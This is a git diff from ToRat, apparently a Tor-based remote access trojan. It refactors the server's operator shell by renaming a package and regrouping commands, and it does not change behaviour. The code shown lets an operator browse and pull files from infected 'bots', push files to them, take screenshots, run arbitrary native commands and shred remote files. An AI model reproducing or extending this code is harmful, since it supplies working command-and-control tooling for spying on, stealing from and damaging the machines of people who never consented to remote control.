@@ -7,7 +7,7 @@ import (
 	"strings"
 
 	"github.com/abiosoft/ishell"
-	"github.com/lu4p/ToRat/models"
+	"github.com/lu4p/ToRat/shared"
 	"github.com/lu4p/shred"
 )
 
@@ -19,7 +19,7 @@ func (client activeClient) shellClient() {
 
 	// Set shell and get working dir
 	shell := ishell.New()
-	r := models.Dir{}
+	r := shared.Dir{}
 	err := client.RPC.Call("API.LS", void, &r)
 	if err != nil {
 		// TODO: This may cause false positive on edges cases
@@ -29,71 +29,69 @@ func (client activeClient) shellClient() {
 
 	shell.SetPrompt(yellow("["+client.Client.Name+"] ") + blue(client.Dir.Path) + "$ ")
 
-	shell.AddCmd(&ishell.Cmd{
-		Name: "cd",
-		Func: func(c *ishell.Context) {
-			client.Cd(c)
-			shell.SetPrompt(yellow("["+client.Client.Name+"] ") + blue(client.Dir.Path) + "$ ")
+	commands := []*ishell.Cmd{
+		{
+			Name: "cd",
+			Func: func(c *ishell.Context) {
+				client.Cd(c)
+				shell.SetPrompt(yellow("["+client.Client.Name+"] ") + blue(client.Dir.Path) + "$ ")
+			},
+			Completer: fileCompleter,
+			Help:      "change the working directory of the client",
 		},
-		Completer: fileCompleter,
-		Help:      "change the working directory of the client",
-	})
-
-	shell.AddCmd(&ishell.Cmd{
-		Name: "ls",
-		Func: client.ls,
-		Help: "list the files in a directory",
-	})
-
-	shell.AddCmd(&ishell.Cmd{
-		Name:      "cat",
-		Func:      client.Cat,
-		Help:      "print the content of a file: usage cat <file>",
-		Completer: fileCompleter,
-	})
-
-	shell.AddCmd(&ishell.Cmd{
-		Name:      "down",
-		Func:      client.Download,
-		Help:      "download a file from the client: usage down <file>",
-		Completer: fileCompleter,
-	})
-
-	shell.AddCmd(&ishell.Cmd{
-		Name: "up",
-		Func: client.Upload,
-		Help: "upload a file from the cwd of the Server to cwd of the client: usage up <file>",
-	})
-
-	shell.AddCmd(&ishell.Cmd{
-		Name: "screen",
-		Func: client.Screen,
-		Help: "take a screenshot of the client and upload it to the server",
-	})
-
-	shell.AddCmd(&ishell.Cmd{
-		Name: "escape",
-		Func: client.runCommand,
-		Help: "escape a command and run it natively on client",
-	})
-
-	shell.AddCmd(&ishell.Cmd{
-		Name: "reconnect",
-		Func: func(c *ishell.Context) {
-			client.Reconnect(c)
-			shell.Close()
+		{
+			Name: "ls",
+			Func: client.ls,
+			Help: "list the files in a directory",
 		},
-		Help: "tell the client to reconnect",
-	})
-
-	shell.AddCmd(&ishell.Cmd{
-		Name: "exit",
-		Func: func(c *ishell.Context) {
-			c.Stop()
-			shell.Close()
+		{
+			Name:      "cat",
+			Func:      client.Cat,
+			Help:      "print the content of a file: usage cat <file>",
+			Completer: fileCompleter,
 		},
-		Help: "background the current session",
-	})
+		{
+			Name:      "down",
+			Func:      client.Download,
+			Help:      "download a file from the client: usage down <file>",
+			Completer: fileCompleter,
+		},
+		{
+			Name: "up",
+			Func: client.Upload,
+			Help: "upload a file from the cwd of the Server to cwd of the client: usage up <file>",
+		},
+		{
+			Name: "screen",
+			Func: client.Screen,
+			Help: "take a screenshot of the client and upload it to the server",
+		},
+		{
+			Name: "escape",
+			Func: client.runCommand,
+			Help: "escape a command and run it natively on client",
+		},
+		{
+			Name: "reconnect",
+			Func: func(c *ishell.Context) {
+				client.Reconnect(c)
+				shell.Close()
+			},
+			Help: "tell the client to reconnect",
+		},
+		{
+			Name: "exit",
+			Func: func(c *ishell.Context) {
+				c.Stop()
+				shell.Close()
+			},
+			Help: "background the current session",
+		},
+	}
+
+	for _, c := range commands {
+		shell.AddCmd(c)
+	}
 
 	shell.NotFound(client.runCommand)
 	shell.Run()
@@ -101,7 +99,7 @@ func (client activeClient) shellClient() {
 
 // ls remote directory
 func (client *activeClient) ls(c *ishell.Context) {
-	r := models.Dir{}
+	r := shared.Dir{}
 	err := client.RPC.Call("API.LS", void, &r)
 	if err != nil {
 		c.Println(yellow("["+client.Client.Name+"] ") + red("[!] Encoutered error during list!"))
@@ -129,9 +127,8 @@ func (client *activeClient) Cat(c *ishell.Context) {
 // Change remote directory
 func (client *activeClient) Cd(c *ishell.Context) {
 	path := strings.Join(c.Args, " ")
-	r := models.Dir{}
+	r := shared.Dir{}
 	err := client.RPC.Call("API.Cd", path, &r)
-
 	if err != nil {
 		c.Println(yellow("["+client.Client.Name+"] ") + red("[!] Could not change to that path!"))
 		c.Println(yellow("["+client.Client.Name+"] ") + red("[!] ", err))
@@ -141,7 +138,7 @@ func (client *activeClient) Cd(c *ishell.Context) {
 
 // Download a remote file
 func (client *activeClient) Download(c *ishell.Context) {
-	var r models.File
+	var r shared.File
 	arg := strings.Join(c.Args, " ")
 
 	c.ProgressBar().Indeterminate(true)
@@ -155,19 +152,17 @@ func (client *activeClient) Download(c *ishell.Context) {
 		return
 	}
 
-	dl_path := filepath.Join("/ToRat/cmd/server/bots/", client.Client.Hostname, r.Fpath)
-	dl_dir, _ := filepath.Split(dl_path)
+	dlPath := filepath.Join("/ToRat/cmd/server/bots/", client.Client.Hostname, r.Fpath)
+	dlDir, _ := filepath.Split(dlPath)
 
-	err = os.MkdirAll(dl_dir, os.ModePerm)
-	if err != nil {
+	if err := os.MkdirAll(dlDir, os.ModePerm); err != nil {
 		c.ProgressBar().Final(green("[Server] ") + red("[!] Could not create directory path!"))
 		c.ProgressBar().Stop()
 		c.Println(green("[Server] ") + red("[!] ", err))
 		return
 	}
 
-	err = ioutil.WriteFile(dl_path, r.Content, 0600)
-	if err != nil {
+	if err := ioutil.WriteFile(dlPath, r.Content, 0600); err != nil {
 		c.ProgressBar().Final(green("[Server] ") + red("[!] Download failed to write to path!"))
 		c.ProgressBar().Stop()
 		c.Println(green("[Server] ") + red("[!] ", err))
@@ -194,14 +189,13 @@ func (client *activeClient) Upload(c *ishell.Context) {
 		return
 	}
 
-	f := models.File{
+	f := shared.File{
 		Content: content,
 		Path:    path,
 		Perm:    info.Mode(),
 	}
 
-	err = client.RPC.Call("API.RecvFile", f, &void)
-	if err != nil {
+	if err := client.RPC.Call("API.RecvFile", f, &void); err != nil {
 		c.ProgressBar().Final(green("[Server] ") + red("[!] Upload failed!"))
 		c.ProgressBar().Stop()
 		c.Println(green("[Server] ") + red("[!] ", err))
@@ -221,14 +215,13 @@ func (client *activeClient) Screen(c *ishell.Context) {
 	filename := getTimeSt() + ".png"
 	var r []byte
 
-	err := client.RPC.Call("API.Screen", void, &r)
-	if err != nil {
+	if err := client.RPC.Call("API.Screen", void, &r); err != nil {
 		c.ProgressBar().Final(yellow("["+client.Client.Name+"] ") + red("[!] Screenshot failed!"))
 		c.ProgressBar().Stop()
 		c.Println(yellow("["+client.Client.Name+"] ") + red("[!] ", err))
 		return
 	}
-	err = ioutil.WriteFile(filepath.Join(client.Client.Path, filename), r, 0600)
+	err := ioutil.WriteFile(filepath.Join(client.Client.Path, filename), r, 0600)
 	if err != nil {
 		c.ProgressBar().Final(green("[Server] ") + red("[!] Screenshot could not be saved"))
 		c.ProgressBar().Stop()
@@ -237,7 +230,6 @@ func (client *activeClient) Screen(c *ishell.Context) {
 	}
 	c.ProgressBar().Final(green("[Server] ") + green("[+] Screenshot received"))
 	c.ProgressBar().Stop()
-
 }
 
 // Force client reconnect
@@ -251,7 +243,7 @@ func (client *activeClient) Reconnect(c *ishell.Context) {
 // Remove remote file
 // TODO: Is this used? Where?
 func (client *activeClient) Shred(c *ishell.Context) {
-	args := models.Shred{
+	args := shared.Shred{
 		Conf: shred.Conf{
 			Times:  3,
 			Zeros:  true,
@@ -260,8 +252,7 @@ func (client *activeClient) Shred(c *ishell.Context) {
 		Path: strings.Join(c.Args, " "),
 	}
 	var r error
-	err := client.RPC.Call("API.Shred", &args, &r)
-	if err != nil {
+	if err := client.RPC.Call("API.Shred", &args, &r); err != nil {
 		c.Println(red("[!] Could not shred path:", args.Path, err, r))
 	}
 }
@@ -276,7 +267,7 @@ func (client *activeClient) Ping(c *ishell.Context) error {
 func (client *activeClient) runCommand(c *ishell.Context) {
 	command := strings.Join(c.Args, " ")
 	var r string
-	args := models.Cmd{
+	args := shared.Cmd{
 		Cmd:        command,
 		Powershell: false,
 	}
